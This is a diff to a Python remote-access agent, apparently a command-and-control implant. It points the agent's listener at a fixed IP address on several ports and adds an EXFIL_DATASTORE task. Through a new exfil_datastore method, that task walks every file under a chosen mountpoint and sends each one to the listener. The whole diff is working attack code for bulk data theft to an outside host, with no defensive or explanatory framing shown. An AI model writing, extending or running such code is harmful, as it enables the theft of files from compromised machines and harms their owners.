@@ -3,6 +3,7 @@ import sys
 import ssl
 import zlib
 import json
+import shutil
 import time as t
 import socket
 import base64
@@ -14,7 +15,7 @@ import subprocess
 from random import randrange
 
 
-_LISTENER_HOST = "localhost"
+_LISTENER_HOST = "10.200.200.10"
 _LISTENER_PORTS = [8080, 1235, 9001]
 _LISTENER_SECRET = "whatever"
 _AGENT_LOGLEVEL = logging.DEBUG
@@ -176,6 +177,17 @@ class Agent:
         response_pkt = "_response" + json.dumps(response_packet_stub)
         return self.tls_transact_msg(response_pkt)
 
+    def exfil_datastore(self, mountpoint):
+        logging.debug("Exfiltrating datastore at " + mountpoint)
+        for path,dirs,files in os.walk(mountpoint):
+            for file in files:
+                filename = os.path.join(path,file)
+                relpath = os.path.relpath(filename,mountpoint)
+                filesize = os.path.getsize(filename)
+                print("Transfering " + filename)
+                self.send_file(filename)
+        
+
     def send_file(self, filename):
         logging.debug("Sending file")
         offset = 0
@@ -265,6 +277,11 @@ class Agent:
             file = task["file"]
             logging.debug("GET_FILE: " + file)
             self.send_file(file)
+
+        if task["cmd"] == "EXFIL_DATASTORE":
+            mountpoint = task["mountpoint"]
+            logging.debug("EXFIL_DATASTORE: " + mountpoint)
+            self.exfil_datastore(mountpoint)
 
     def write_pid_file(self):
         my_pid = str(os.getpid())
